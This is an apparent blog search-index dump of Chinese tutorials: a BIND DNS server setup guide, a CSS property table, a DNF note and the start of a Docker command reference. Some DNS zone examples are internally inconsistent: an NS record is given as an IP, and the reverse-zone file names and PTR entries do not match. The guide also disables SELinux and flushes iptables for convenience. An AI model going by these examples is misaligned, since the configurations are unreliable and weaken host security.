包管理器不会太受那些经验老道的 Linux 系统管理者的欢迎。举例如下： 在 DNF 中没有 –skip-broken 命令，并且没有替代命令供选择。 在 DNF 中没有判断哪个包提供了指定依赖的 resolvedep 命令。 在 DNF 中没有用来列出某个软件依赖包的 deplist 命令。 当你在 DNF 中排除了某个软件库，那么该操作将会影响到你之后所有的操作，不像在 YUM 下那样，你的排除操作只会咋升级和安装软件时才起作用。","link":"/2020/08/03/dnf%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8/"},{"title":"dns","text":"DNS概述DNS服务器：什么是DNS服务器？简单来说就是将不容易记住的IP地址转换为容易主机的网站域名的一个服务器（www.baidu.com www.taobao.com） 12 vim /etc/nsswitch.conf hosts: files dns #涉及到名称翻译的都会先查找/etc/hosts,再查找DNS(/etc/resolv.conf) 主机名和域名的区别？ 主机名是内网的名字域名是外网的名字 主机名和域名其实是两个完全可以不同的名字，但是有很多软件（如邮件系统postfix)会默认认为它们一致 DNS服务器特点： 1，分布式的数据库2，解决了数据不一致，避免了名字冲突3，有缓存机制，提高了性能和可靠性 分层结构，最多127层 查询方式：递归查询，迭代查询 全世界共有有13台DNS根域服务器 顶级域名 12345678.com .org .edu .gov .net .mil .info商业 组织 教育 政府 通讯 军事 信息 根 cn hk us jp tw in .com.cn .net.us .edu.cn 深圳电信的DNS地址： 首选的：202.96.134.133 备选的：202.96.128.86 课后扩展：上网查询 全球现在免费的DNS服务器 对应的linux主机上写DNS指向，由/etc/resolv.conf 123 vim /etc/resolv.conf nameserver 192.168.224.2 #一共可以写三个，如果第一个没有记录，则找第二个nameserver 8.8.8.8 1234567891011121314151617 根（com） ｜ ｜ 中国(cn) USA ｜ ｜ 大运营商(电信) ｜ ｜ 小运营商(百度，google) ｜ ｜ ｜自己的DNS服务器 US电信 ｜ ｜ ｜ ｜qianyun.com.cn. abc.com.us. 上图中qianyun在小运营商申请了域名，自己搭DNS服务器，请问如何与运营商联系起来（意思就是说，域名的查询怎样才能转到你自己搭的DNS服务器） 如果上面的DNS服务器做好了，全世界的任意一个访问点如何能访问到你的这个DNS服务器里的域名？ 上图中DNS服务器里除了自己的域名和IP对应，能否写上qq.com这个域和IP的对应呢? =========================================================== 开始安装DNS服务器bind (berkeley internet name domain) 1yum install bind* -y 查看软件包； 1234567891011121314151617 rpm -qa |grep ^bind- #rhel7.3下的包 bind-pkcs11-libs-9.9.4-73.el7_6.x86_64bind-sdb-9.9.4-73.el7_6.x86_64bind-pkcs11-9.9.4-73.el7_6.x86_64bind-devel-9.9.4-73.el7_6.x86_64bind-libs-9.9.4-73.el7_6.x86_64bind-libs-lite-9.9.4-73.el7_6.x86_64bind-9.9.4-73.el7_6.x86_64bind-sdb-chroot-9.9.4-73.el7_6.x86_64bind-dyndb-ldap-11.1-4.el7.x86_64bind-lite-devel-9.9.4-73.el7_6.x86_64bind-pkcs11-devel-9.9.4-73.el7_6.x86_64bind-utils-9.9.4-73.el7_6.x86_64bind-license-9.9.4-73.el7_6.noarchbind-chroot-9.9.4-73.el7_6.x86_64bind-pkcs11-utils-9.9.4-73.el7_6.x86_64 DNS使用的协议端口： tcp/udp 53 查询DNS记录只使用udp 53端口主DNS服务器和备DNS服务器之间的数据同步使用tcp 53端口 配置文件的目录： 配置文件为/etc/named.conf数据文件在/var/named目录下 安装完成后启动DNS服务器： 12systemctl start namedsystemctl enable named 配置文件详解： 123456789101112131415161718192021222324252627282930options {listen-on port 53 { any; }; #监听端口 IPV4listen-on-v6 port 53 { any; }; #监听端口 IPV6directory &quot;/var/named&quot;; #工作目录dump-file &quot;/var/named/data/cache_dump.db&quot;; #数据存放目录statistics-file &quot;/var/named/data/named_stats.txt&quot;; #数据存放目录memstatistics-file &quot;/var/named/data/named_mem_stats.txt&quot;; #数据存放目录allow-query { any; }; #允许解析的IP地址recursion yes; # 开启递归查询dnssec-enable yes; #开启加密dnssec-validation yes; #在递归查询服务器上开启DNSSEC验证/* Path to ISC DLV key */bindkeys-file &quot;/etc/named.iscdlv.key&quot;; managed-keys-directory &quot;/var/named/dynamic&quot;; };logging { #日志 channel default_debug { file &quot;data/named.run&quot;; severity dynamic; };};zone &quot;.&quot; IN { type hint; file &quot;named.ca&quot;;};include &quot;/etc/named.rfc1912.zones&quot;;include &quot;/etc/named.root.key&quot;; 例一.正向解析(将域名解析成ip)配置步骤： 1，编辑named.conf –记录你的域和域对应的数据文件在哪 2, 编辑zone区域文件 –就是数据文件，记录域名和IP的对应 1234567891011 vim /etc/named.confoptions { listen-on port 53 { any; }; #改为any，表示监听所有来自53端口的请求 listen-on-v6 port 53 { ::1; }; directory &quot;/var/named&quot;; dump-file &quot;/var/named/data/cache_dump.db&quot;; statistics-file &quot;/var/named/data/named_stats.txt&quot;; memstatistics-file &quot;/var/named/data/named_mem_stats.txt&quot;; recursing-file &quot;/var/named/data/named.recursing&quot;; secroots-file &quot;/var/named/data/named.secroots&quot;; allow-query { any; }; #改为any，表示所有客户端都可以访问该服务器 123456 vim /etc/named.rfc1912.zones #打开这个文件，最后加上一个域的配置zone &quot;server2.com&quot; IN { type master; file &quot;data/server2.com.zone&quot;;}; 12345678910111213vim /var/named/data/server2.com.zone #建立数据文件，路径要对应上面的配置$TTL 3600 ; 缓存时间（生存周期）@ IN SOA ns.server2.com. root.server2.com. ( ; #DNS服务器名称 DNS管理员邮箱；可以随便写，但最后得有个 . 0 ; #更新序列号（主从服务器时使用） 30 ; #更新时间 60 ; #重试时间 90 ; 失效时间 3600 ) ; #无效解析记录缓存时间@ IN NS 192.168.224.12. ; NS = name server #域名服务器地址（注意：这里可以写域名或IP，后方必须有个 . ）www IN A 192.168.224.12 ; A = address #A记录，表示直接将该域名解析至指定服务器mail IN A 192.168.224.13 ; dns IN A 192.168.224.12 ; #一个IP可以解析为多个域名bbs IN A 192.168.224.13 ; #同理，一个域名也可解析为多个IP 12345$TTL 600@ IN SOA @ IN SOA ns.server2.com. root.server2.com ( 2019071701; 1D; 1H; 1W; 3H; ) @ NS ns.server2.comdns A 192.168.224.11www A 192.168.224.12 3.配置完成，重启服务 1systemctl restart named 4.测试，客户端修改nameserver，指向自己搭建的服务器 1234 vim /etc/resolv.conf Generated by NetworkManagersearch localdomainnameserver 192.168.224.12 12345678910111213 nslookup mail.server2.comServer: 192.168.224.12Address: 192.168.224.12#53Name: mail.server2.comAddress: 192.168.224.13 #这里可以看到该域名的解析情况 nslookup bbs.server2.comServer: 192.168.224.12Address: 192.168.224.12#53Name: bbs.server2.comAddress: 192.168.224.13 例二：反向解析IP解析为域名比如我们使用公司的一台内部机器，可以模拟zhangsan@126.com去给另一个@qq.com发邮件； 那么qq如何知道你发的这封邮件是真的从126来的？通过反向解析（IP解析为域名)就可以判别 第一步：服务器端主配置文件添加以下区域： 123456 vim /etc/named.rfc1912.zoneszone &quot;224.168.192.in-addr.arpa&quot; IN { type master; file &quot;data/master.224.168.192.in-addr.arpa.zone&quot;;}; 我这里做的是一个内网网段，在这里只是实验 第二步：建立区域数据文件 1234567891011 vim /var/named/data/master.3.3.3.in-addr.arpa.zone$TTL 86400@ IN SOA 224.168.192. root. ( 0 30 40 50 86400 ) IN NS 192.168.224.12.3 IN PTR www.server2.com. ; 将192.168.224.12解析为www.server2.com4 IN PTR bbs.server2.com. ; 将192.168.224.13解析为bbs.server2.com 注意反向解析后方的 . 重启named 1systemctl restart named 第三步；客户端测试 1234567891011 nslookup 192.168.224.12Server: 192.168.224.12Address: 192.168.224.12#53192.168.224.12.in-addr.arpa name = www.server2.com. --反向解析成功 nslookup 192.168.224.13Server: 192.168.224.12Address: 192.168.224.12#534.3.3.3.in-addr.arpa name = bbs.server2.com. 例三：使用DNS轮询实现简单的不可靠的负载均衡（一个域名对应多台服务器） DNS轮循相对于其它的负载均衡软件来说：优点：配置简单，成本低缺点：没有后台健康检查，算法单一,因为DNS的缓存，会影响你修改DNS调度的生效速度 client | DNS服务器 ｜ ｜ `www.server2.com` web1 web2 web3 192.168.224.12 192.168.224.13 192.168.224.14 rsync 共享存储 保证数据一致 服务器端操作： 第一步： vim /etc/named.rfc1912.zones –打开这个文件，最后加上一个域的配置（刚刚有添加的就不用添加了） 1234zone &quot;server2.com&quot; IN { type master; file &quot;data/server2.com.zone&quot;;}; 第二步： 1234567891011121314 vim /var/named/data/server2.com.zone $TTL 3600@ IN SOA ns.server2.com. root.server2.com. ( 0 30 60 90 3600 )@ IN NS 192.168.224.12.ns IN A 192.168.224.12www IN A 192.168.224.12www IN A 192.168.224.13www IN A 192.168.224.14 第三步：客户端测试 12345678910 nslookup www.server2.comServer: 192.168.224.12Address: 192.168.224.12#53Name: www.server2.comAddress: 192.168.224.14Name: www.server2.comAddress: 192.168.224.12Name: www.server2.comAddress: 192.168.224.13 #单域名对应多机器解析成功 例四：CNAME记录的使用（一个IP对应多个域名) 别名 vim /var/named/data/master.server2.com.zone 123456789101112$TTL 86400@ IN SOA ns.server2.com. root.server2.com. ( 2013011101 10 20 30 86400 ) IN NS 192.168.224.12.aaa IN CNAME wwwwww IN A 192.168.224.12www IN A 192.168.224.13www IN A 192.168.224.14 客户端测试： 12345678910111213141516171819202122 nslookup www.server2.comServer: 192.168.224.12Address: 192.168.224.12#53Name: www.server2.comAddress: 192.168.224.14Name: www.server2.comAddress: 192.168.224.12Name: www.server2.comAddress: 192.168.224.13[root@server ~]# nslookup aaa.server2.comServer: 192.168.224.12Address: 192.168.224.12#53aaa.server2.com canonical name = www.server2.com. #注意看这条Name: www.server2.comAddress: 192.168.224.13Name: www.server2.comAddress: 192.168.224.12Name: www.server2.comAddress: 192.168.224.14 例五：直接对域的解析（域名不需要前缀） 1234567891011 vim /var/named/data/server2.com.zone$TTL 86400@ IN SOA ns. root. ( 2013011101 10 20 30 86400 ) IN NS 192.168.224.12.server2.com. IN A 192.168.224.12 #直接写域名即可 配置完成，重启服务 systemctl restart named 测试： 123456 nslookup server2.comServer: 192.168.224.12Address: 192.168.224.12#53Name: server2.comAddress: 192.168.224.12 #解析成功 例六：使用通配符实现泛解析123456789101112vim /var/named/data/server2.com.zone* IN A 192.168.224.13 nslookup a.server2.comServer: 192.168.224.12Address: 192.168.224.12#53Name: a.server2.comAddress: 192.168.224.13 123456[root@server ~]# nslookup b.server2.comServer: 192.168.224.12Address: 192.168.224.12#53Name: b.server2.comAddress: 192.168.224.13 例七： 辅助DNS服务器（从DNS服务器）的配置​ 192.168.224.12 192.168.224.13 主 －－－－ 从 type master type slave zone文件 被动的从主传过来zone文件 从DNS服务器的准备工作： 和主DNS服务器一样 准备工作有：1，主机名三步2，时间同步3，iptables,selinux关闭 iptables -L –查看,有写规则的话,则表示需要关闭 iptables -F –清空规则 systemctl disable iptables vim /etc/selinux/config SELINUX=disabled #改为disabled reboot #selinux的关闭需要重启电脑才能完全生效 如果你不想重启来关闭selinux，那么使用setenforce 0(这不是关闭selinux，只是改成警告模式,但是这种模式不会拒绝你的操作) 4，yum配置好 1，配置从服务器的主配置文件 在从服务器上安装bind软件包 yum install bind* -y vim /etc/named.conf #打开此文件，和主的配法一样 12345678910111213141516171819202122232425262728293031323334options { listen-on port 53 { any; }; #改为any listen-on-v6 port 53 { ::1; }; directory &quot;/var/named&quot;; dump-file &quot;/var/named/data/cache_dump.db&quot;; statistics-file &quot;/var/named/data/named_stats.txt&quot;; memstatistics-file &quot;/var/named/data/named_mem_stats.txt&quot;; allow-query { any; }; #改为any recursion yes; dnssec-enable yes; dnssec-validation yes; dnssec-lookaside auto; /* Path to ISC DLV key */ bindkeys-file &quot;/etc/named.iscdlv.key&quot;; managed-keys-directory &quot;/var/named/dynamic&quot;;};logging { channel default_debug { file &quot;data/named.run&quot;; severity dynamic; };};zone &quot;.&quot; IN { type hint; file &quot;named.ca&quot;;};include &quot;/etc/named.rfc1912.zones&quot;;include &quot;/etc/named.root.key&quot;; vim /etc/named.rfc1912.zones #在最后加上下面一段 12345zone &quot;server2.com&quot; IN { type slave; #类型定义为slave file &quot;slaves/slave.server2.com.zone&quot;; #最好把zone文件定义到slaves目录下； masters { 192.168.224.12; }; #指定主DNS服务器的IP地址}; systemctl start named #在从上启动named服务 ls /var/named/slaves/ #再次查看发现是主上面下载过来了slave.server2.com.zone 如果不能下载过来： 查看网络是否连通，就是ping一下 查看iptables,selinux是否关闭 tail /var/log/messages #或者查看日志也可以看到相关的日志内容 例九：转发服务器的设置前面所做的全是一个域的情况，也就是我只能解析server2.com这一个域，如果想要解析另外一个域该怎么办？ 方法一：在/etc/named.conf 里再写一个域然后再配置一个对应zone数据文件重启服务 方法二：做转发先在其它机器上搭建一个test.com 的域名解析 单域转发1,named.conf里加上下面一段 12345678910zone &quot;test.com&quot; IN { type forward; forwarders { 192.168.224.14; }; #将test.com这个域的解析转发到3.5的服务器上};修改dnssec-validation改为nooptions { dnssec-validation no; #在递归查询服务器上关闭DNSSEC验证}; systemctl restart named nslookup test.com #查找能查出来，是因为127的DNS服务器的zone文件里有，我这里转发过去查找到结果，再返回过来 123456Server: 192.168.224.12Address: 192.168.224.12#53Non-authoritative answer:Name: www.test.comAddress: 192.168.224.12 2，完全转发 12345678910 vim /etc/named.confoptions { dnssec-validation no; forwarders { 114.114.114.114; }; #这是写到options里的完全转发，指的是本机的zone文件查不到的情况，会去查找10.0.0.1,都查不到才会返回错误};options { forwarders { 8.8.8.8;114.114.114.114; }; #可以用分号隔开，写多个转发服务器的IP};","link":"/2020/08/03/dns/"},{"title":"css属性汇总","text":"一,css属性汇总“CSS” 列指示该属性是在哪个 CSS 版本（CSS1、CSS2 或 CSS3）中定义的。 CSS3 动画属性（Animation） 属性 描述 CSS @keyframes 规定动画。 3 animation 所有动画属性的简写属性，除了 animation-play-state 属性。 3 animation-name 规定 @keyframes 动画的名称。 3 animation-duration 规定动画完成一个周期所花费的秒或毫秒。 3 animation-timing-function 规定动画的速度曲线。 3 animation-delay 规定动画何时开始。 3 animation-iteration-count 规定动画被播放的次数。 3 animation-direction 规定动画是否在下一周期逆向地播放。 3 animation-play-state 规定动画是否正在运行或暂停。 3 animation-fill-mode 规定对象动画时间之外的状态。 3 CSS 背景属性（Background） 属性 描述 CSS background 在一个声明中设置所有的背景属性。 1 background-attachment 设置背景图像是否固定或者随着页面的其余部分滚动。 1 background-color 设置元素的背景颜色。 1 background-image 设置元素的背景图像。 1 background-position 设置背景图像的开始位置。 1 background-repeat 设置是否及如何重复背景图像。 1 background-clip 规定背景的绘制区域。 3 background-origin 规定背景图片的定位区域。 3 background-size 规定背景图片的尺寸。 3 CSS 边框属性（Border 和 Outline） 属性 描述 CSS border 在一个声明中设置所有的边框属性。 1 border-bottom 在一个声明中设置所有的下边框属性。 1 border-bottom-color 设置下边框的颜色。 2 border-bottom-style 设置下边框的样式。 2 border-bottom-width 设置下边框的宽度。 1 border-color 设置四条边框的颜色。 1 border-left 在一个声明中设置所有的左边框属性。 1 border-left-color 设置左边框的颜色。 2 border-left-style 设置左边框的样式。 2 border-left-width 设置左边框的宽度。 1 border-right 在一个声明中设置所有的右边框属性。 1 border-right-color 设置右边框的颜色。 2 border-right-style 设置右边框的样式。 2 border-right-width 设置右边框的宽度。 1 border-style 设置四条边框的样式。 1 border-top 在一个声明中设置所有的上边框属性。 1 border-top-color 设置上边框的颜色。 2 border-top-style 设置上边框的样式。 2 border-top-width 设置上边框的宽度。 1 border-width 设置四条边框的宽度。 1 outline 在一个声明中设置所有的轮廓属性。 2 outline-color 设置轮廓的颜色。 2 outline-style 设置轮廓的样式。 2 outline-width 设置轮廓的宽度。 2 border-bottom-left-radius 定义边框左下角的形状。 3 border-bottom-right-radius 定义边框右下角的形状。 3 border-image 简写属性，设置所有 border-image-* 属性。 3 border-image-outset 规定边框图像区域超出边框的量。 3 border-image-repeat 图像边框是否应平铺(repeated)、铺满(rounded)或拉伸(stretched)。 3 border-image-slice 规定图像边框的向内偏移。 3 border-image-source 规定用作边框的图片。 3 border-image-width 规定图片边框的宽度。 3 border-radius 简写属性，设置所有四个 border-*-radius 属性。 3 border-top-left-radius 定义边框左上角的形状。 3 border-top-right-radius 定义边框右下角的形状。 3 box-decoration-break 3 box-shadow 向方框添加一个或多个阴影。 3 Box 属性 属性 描述 CSS overflow-x 如果内容溢出了元素内容区域，是否对内容的左/右边缘进行裁剪。 3 overflow-y 如果内容溢出了元素内容区域，是否对内容的上/下边缘进行裁剪。 3 overflow-style 规定溢出元素的首选滚动方法。 3 rotation 围绕由 rotation-point 属性定义的点对元素进行旋转。 3 rotation-point 定义距离上左边框边缘的偏移点。 3 Color 属性 属性 描述 CSS color-profile 允许使用源的颜色配置文件的默认以外的规范。 3 opacity 规定元素的不透明级别。 3 rendering-intent 允许使用颜色配置文件渲染意图的默认以外的规范。 3 Content for Paged Media 属性 属性 描述 CSS bookmark-label 规定书签的标记。 3 bookmark-level 规定书签的级别。 3 bookmark-target 规定书签链接的目标。 3 float-offset 将元素放在 float 属性通常放置的位置的相反方向。 3 hyphenate-after 规定连字单词中连字符之后的最小字符数。 3 hyphenate-before 规定连字单词中连字符之前的最小字符数。 3 hyphenate-character 规定当发生断字时显示的字符串。 3 hyphenate-lines 指示元素中连续断字连线的最大数。 3 hyphenate-resource 规定帮助浏览器确定断字点的外部资源（逗号分隔的列表）。 3 hyphens 设置如何对单词进行拆分，以改善段落的布局。 3 image-resolution 规定图像的正确分辨率。 3 marks 向文档添加裁切标记或十字标记。 3 string-set 3 CSS 尺寸属性（Dimension） 属性 描述 CSS height 设置元素高度。 1 max-height 设置元素的最大高度。 2 max-width 设置元素的最大宽度。 2 min-height 设置元素的最小高度。 2 min-width 设置元素的最小宽度。 2 width 设置元素的宽度。 1 可伸缩框属性（Flexible Box） 属性 描述 CSS box-align 规定如何对齐框的子元素。 3 box-direction 规定框的子元素的显示方向。 3 box-flex 规定框的子元素是否可伸缩。 3 box-flex-group 将可伸缩元素分配到柔性分组。 3 box-lines 规定当超出父元素框的空间时，是否换行显示。 3 box-ordinal-group 规定框的子元素的显示次序。 3 box-orient 规定框的子元素是否应水平或垂直排列。 3 box-pack 规定水平框中的水平位置或者垂直框中的垂直位置。 3 CSS 字体属性（Font） 属性 描述 CSS font 在一个声明中设置所有字体属性。 1 font-family 规定文本的字体系列。 1 font-size 规定文本的字体尺寸。 1 font-size-adjust 为元素规定 aspect 值。 2 font-stretch 收缩或拉伸当前的字体系列。 2 font-style 规定文本的字体样式。 1 font-variant 规定是否以小型大写字母的字体显示文本。 1 font-weight 规定字体的粗细。 1 内容生成（Generated Content） 属性 描述 CSS content 与 :before 以及 :after 伪元素配合使用，来插入生成内容。 2 counter-increment 递增或递减一个或多个计数器。 2 counter-reset 创建或重置一个或多个计数器。 2 quotes 设置嵌套引用的引号类型。 2 crop 允许被替换元素仅仅是对象的矩形区域，而不是整个对象。 3 move-to 从流中删除元素，然后在文档中后面的点上重新插入。 3 page-policy 确定元素基于页面的 occurrence 应用于计数器还是字符串值。 3 Grid 属性 属性 描述 CSS grid-columns 规定网格中每个列的宽度。 3 grid-rows 规定网格中每个列的高度。 3 Hyperlink 属性 属性 描述 CSS target 简写属性，设置target-name、target-new以及target-position属性。 3 target-name 规定在何处打开链接（链接的目标）。 3 target-new 规定目标链接在新窗口还是在已有窗口的新标签页中打开。 3 target-position 规定在何处放置新的目标链接。 3 CSS 列表属性（List） 属性 描述 CSS list-style 在一个声明中设置所有的列表属性。 1 list-style-image 将图象设置为列表项标记。 1 list-style-position 设置列表项标记的放置位置。 1 list-style-type 设置列表项标记的类型。 1 marker-offset 2 CSS 外边距属性（Margin） 属性 描述 CSS margin 在一个声明中设置所有外边距属性。 1 margin-bottom 设置元素的下外边距。 1 margin-left 设置元素的左外边距。 1 margin-right 设置元素的右外边距。 1 margin-top 设置元素的上外边距。 1 Marquee 属性 属性 描述 CSS marquee-direction 设置移动内容的方向。 3 marquee-play-count 设置内容移动多少次。 3 marquee-speed 设置内容滚动得多快。 3 marquee-style 设置移动内容的样式。 3 多列属性（Multi-column） 属性 描述 CSS column-count 规定元素应该被分隔的列数。 3 column-fill 规定如何填充列。 3 column-gap 规定列之间的间隔。 3 column-rule 设置所有 column-rule-* 属性的简写属性。 3 column-rule-color 规定列之间规则的颜色。 3 column-rule-style 规定列之间规则的样式。 3 column-rule-width 规定列之间规则的宽度。 3 column-span 规定元素应该横跨的列数。 3 column-width 规定列的宽度。 3 columns 规定设置 column-width 和 column-count 的简写属性。 3 CSS 内边距属性（Padding） 属性 描述 CSS padding 在一个声明中设置所有内边距属性。 1 padding-bottom 设置元素的下内边距。 1 padding-left 设置元素的左内边距。 1 padding-right 设置元素的右内边距。 1 padding-top 设置元素的上内边距。 1 Paged Media 属性 属性 描述 CSS fit 示意如何对width和height属性均不是auto的被替换元素进行缩放。 3 fit-position 定义盒内对象的对齐方式。 3 image-orientation 规定用户代理应用于图像的顺时针方向旋转。 3 page 规定元素应该被显示的页面特定类型。 3 size 规定页面内容包含框的尺寸和方向。 3 CSS 定位属性（Positioning） 属性 描述 CSS bottom 设置定位元素下外边距边界与其包含块下边界之间的偏移。 2 clear 规定元素的哪一侧不允许其他浮动元素。 1 clip 剪裁绝对定位元素。 2 cursor 规定要显示的光标的类型（形状）。 2 display 规定元素应该生成的框的类型。 1 float 规定框是否应该浮动。 1 left 设置定位元素左外边距边界与其包含块左边界之间的偏移。 2 overflow 规定当内容溢出元素框时发生的事情。 2 position 规定元素的定位类型。 2 right 设置定位元素右外边距边界与其包含块右边界之间的偏移。 2 top 设置定位元素的上外边距边界与其包含块上边界之间的偏移。 2 vertical-align 设置元素的垂直对齐方式。 1 visibility 规定元素是否可见。 2 z-index 设置元素的堆叠顺序。 2 CSS 打印属性（Print） 属性 描述 CSS orphans 设置当元素内部发生分页时必须在页面底部保留的最少行数。 2 page-break-after 设置元素后的分页行为。 2 page-break-before 设置元素前的分页行为。 2 page-break-inside 设置元素内部的分页行为。 2 widows 设置当元素内部发生分页时必须在页面顶部保留的最少行数。 2 CSS 表格属性（Table） 属性 描述 CSS border-collapse 规定是否合并表格边框。 2 border-spacing 规定相邻单元格边框之间的距离。 2 caption-side 规定表格标题的位置。 2 empty-cells 规定是否显示表格中的空单元格上的边框和背景。 2 table-layout 设置用于表格的布局算法。 2 CSS 文本属性（Text） 属性 描述 CSS color 设置文本的颜色。 1 direction 规定文本的方向 / 书写方向。 2 letter-spacing 设置字符间距。 1 line-height 设置行高。 1 text-align 规定文本的水平对齐方式。 1 text-decoration 规定添加到文本的装饰效果。 1 text-indent 规定文本块首行的缩进。 1 text-shadow 规定添加到文本的阴影效果。 2 text-transform 控制文本的大小写。 1 unicode-bidi 设置文本方向。 2 white-space 规定如何处理元素中的空白。 1 word-spacing 设置单词间距。 1 hanging-punctuation 规定标点字符是否位于线框之外。 3 punctuation-trim 规定是否对标点字符进行修剪。 3 text-align-last 设置如何对齐最后一行或紧挨着强制换行符之前的行。 3 text-emphasis 向元素的文本应用重点标记以及重点标记的前景色。 3 text-justify 规定当 text-align 设置为 “justify” 时所使用的对齐方法。 3 text-outline 规定文本的轮廓。 3 text-overflow 规定当文本溢出包含元素时发生的事情。 3 text-shadow 向文本添加阴影。 3 text-wrap 规定文本的换行规则。 3 word-break 规定非中日韩文本的换行规则。 3 word-wrap 允许对长的不可分割的单词进行分割并换行到下一行。 3 2D/3D 转换属性（Transform） 属性 描述 CSS transform 向元素应用 2D 或 3D 转换。 3 transform-origin 允许你改变被转换元素的位置。 3 transform-style 规定被嵌套元素如何在 3D 空间中显示。 3 perspective 规定 3D 元素的透视效果。 3 perspective-origin 规定 3D 元素的底部位置。 3 backface-visibility 定义元素在不面对屏幕时是否可见。 3 过渡属性（Transition） 属性 描述 CSS transition 简写属性，用于在一个属性中设置四个过渡属性。 3 transition-property 规定应用过渡的 CSS 属性的名称。 3 transition-duration 定义过渡效果花费的时间。 3 transition-timing-function 规定过渡效果的时间曲线。 3 transition-delay 规定过渡效果何时开始。 3 用户界面属性（User-interface） 属性 描述 CSS appearance 允许您将元素设置为标准用户界面元素的外观 3 box-sizing 允许您以确切的方式定义适应某个区域的具体内容。 3 icon 为创作者提供使用图标化等价物来设置元素样式的能力。 3 nav-down 规定在使用 arrow-down 导航键时向何处导航。 3 nav-index 设置元素的 tab 键控制次序。 3 nav-left 规定在使用 arrow-left 导航键时向何处导航。 3 nav-right 规定在使用 arrow-right 导航键时向何处导航。 3 nav-up 规定在使用 arrow-up 导航键时向何处导航。 3 outline-offset 对轮廓进行偏移，并在超出边框边缘的位置绘制轮廓。 3 resize 规定是否可由用户对元素的尺寸进行调整。 3","link":"/2020/08/04/css%E5%B1%9E%E6%80%A7%E6%B1%87%E6%80%BB/"},{"title":"docker命令大全","text":"docker 命令大全 1. 镜像仓库1.1 docker search [OPTIONS] TERM // 搜索镜像 12345678910选项: -f --filter filter 都可以说明: 根据条件筛选示例:--filter=is-automated=true 只列出 automated build类型的镜像--filter=stars=10 列出收藏数不小于指定值的镜像 选项: --limit int 设置搜索结果的记录数量 --no-trunc 搜索结果完整显示 1.2 docker pull [OPTIONS] NAME[:TAG|@DIGEST] // 从镜像参数中拉取指定镜像 选项 说明 示例 -a 拉取所有tagged镜像 --disable-content-trust 忽略镜像的校验,默认为true 1.3 docker push [OPTIONS] NAME[:TAG] // 上传镜像到仓库(要先登录仓库) 123456789选项--disable-content-trust说明: 忽略镜像校验示例: docker login docker tag local-image:tagname yichen/mysql:tagname docker push yichen/mysql:tagname 1.4docker login -u 用户名 -p 密码 //登录 1.5 docker logout // 登出 2. 容器操作2.1 docker ps [OPTIONS] //列出容器 选项 说明 示例 -a 显示所有容器,默认只显示正在运行的 docker ps -a -f 过滤 docker ps -f name=hello -n 10 显示最近创建的容器 --no-trunc 显示全部描述 -q 只显示简略ID -s 显示总的文件大小 2.2docker inspect [OPTIONS] NAME|ID //获取容器或镜像的元数据 选项 说明 示例 -f filter 筛选 -s 如果是一个容器的话返回其文件大小 --type image/container 返回指定类型的JSON 2.3 docker top CONTAINER // 查看指定容器中运行的进程2.4 docker attach [OPTIONS] CONTAINER //进入正在运行的容器 选项 说明 示例 -detach-keys string --no-stdin --sig-proxy 默认为true --sig-proxy=false 2.5 docker events [OPTIONS] //从服务器获取实时事件 选项 说明 示例 -f filter 过滤 --since timestamp 显示在指定时间之后发生的事件 docker events --since=1467302400 --until timestamp 显示在指定时间之前所产生的事件 2.6 docker logs [OPTIONS] CONTAINER //获取容器的日志 选项 说明 示例 --details 显示详细日志 -f 日志实时输出 --since timestamp --until timestamp --tail num 输出最后多少行日志 -t 显示日志时间 2.7 docker wait CONTAINER... //等待容器停止并输出其退出代码 2.8 docker export -o fileName.tar CONTAINER //将指定容器打包到tar文档中,可以指定文件路径 2.9 docker port CONTAINER [PORT] // 列出容器的端口映射(容器端口与主机端口对应关系) 3.容器rootfs命令3.1 docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]] // 从一个容器创建一个新的镜像 选项 说明 示例 -a 镜像作者 -c 使用Dockerfile指令创建镜像 -m 提交时的说明文字 -p 在提交时,暂停容器 12示例: docker commit ID new_image_name #镜像打包 (保存对容器的修改)docker commit -m=&quot;提交的描述信息&quot; -a=&quot;作者&quot; 容器id 要创建的目标镜像名:[标签名] 3.2 docker cp // 容器与主机之间的文件复制1234567891011docker cp [options] CONTAINER:SRC_PATH TAR_PATH从容器中复制到主机 docker cp testtomcat：/usr/local/tomcat/webapps/test/js/test.js /opt docker cp [options] SRC_PATH CONTAINER:TAR_PATH从主机复制到容器中 docker cp /opt/test.js testtomcat：/usr/local/tomcat/webapps/test/js选项: -a 复制所有的gid/uid信息-L Always follow symbol link in SRC_PATH 始终遵循原路径的符号信息 3.3 docker difff CONTAINER // 查看容器中被修改过的文件或目录说明:C - Change, D - Delete, A - Add 4. 容器生命周期管理4.1 docker start [options] container... //启动一个或多个容器 选项 说明 示例 -a 启动后进入容器 --detach-keys string -i Attach container's STDIN 4.2 docker stop [options] container... //停止一个或多个容器 选项 说明 示例 -t int 多少秒后停止容器 4.3 docker restart [options] container... //重启一个或多个容器 选项 说明 示例 -t int 多少秒后重启容器 4.4 docker kill [options] container... // 杀死一个或多个容器 选项 说明 示例 -s string 给容器发送一个信号,默认为KILL 4.5 docker rm [options] container... //删除一个或多个容器 选项 说明 示例 -f, -force 强制移除容器 -l, -link 删除指定的连接 -v, -volumes 删除容器及其挂载的卷 4.6 docker pause container... // 暂停容器中所有的进程 4.7 docker unpause container... // 恢复容器中所有的进程 4.8 docker exec [options] container command [arg...] 在运行的容器中执行命令1docker exec -it 77cd6bef4dc9 /bin/bash #进容器 选项 说明 示例 -d, --detach 分离模式, 在后台运行 --detach-keys str `` -e, --env list 设置环境变量 -i, --interactive 保持STDIN打开 与-t结合使用打开一个终端 -t, --tty 分配一个伪终端 与-i结合使用打开一个终端 --privileged 授予命令扩展权限 -u, --user str 指定用户名或用户ID -w, --workdir str 在指定文件目录下执行相应的命令 -w /home container ls -c 执行docker容器命令 docker exec -it zeppelin bash -c 'echo $ZEPPELIN_HOME' 4.9 docker run [optoins] image [command] [arg...] // 运行一个新容器中执行一个命令123456789101112131415运行容器docker run --name 容器名 -d -p 3306:3306 mysql docker 启动容器docker run image_namedocker run -d -p 80:80 nginx:latestrun（创建并运行一个容器） -d 放在后台 -p 端口映射 :docker的容器端口-P 随机分配端口-v 源地址(宿主机):目标地址(容器)docker run -it --name centos6 centos:6.9 /bin/bash -it 分配交互式的终端 --name 指定容器的名字 /bin/sh覆盖容器的初始命令 4.9.1 选项有90个选项:1. --add-host list 说明: 添加自定义的host-ip映射(host:ip) 示例: 2. -a , --attach list 说明: 将容器的stdin,stdout,stderr【标准输入，标准输出，错误输出】关联到本地shell中，在执行docker 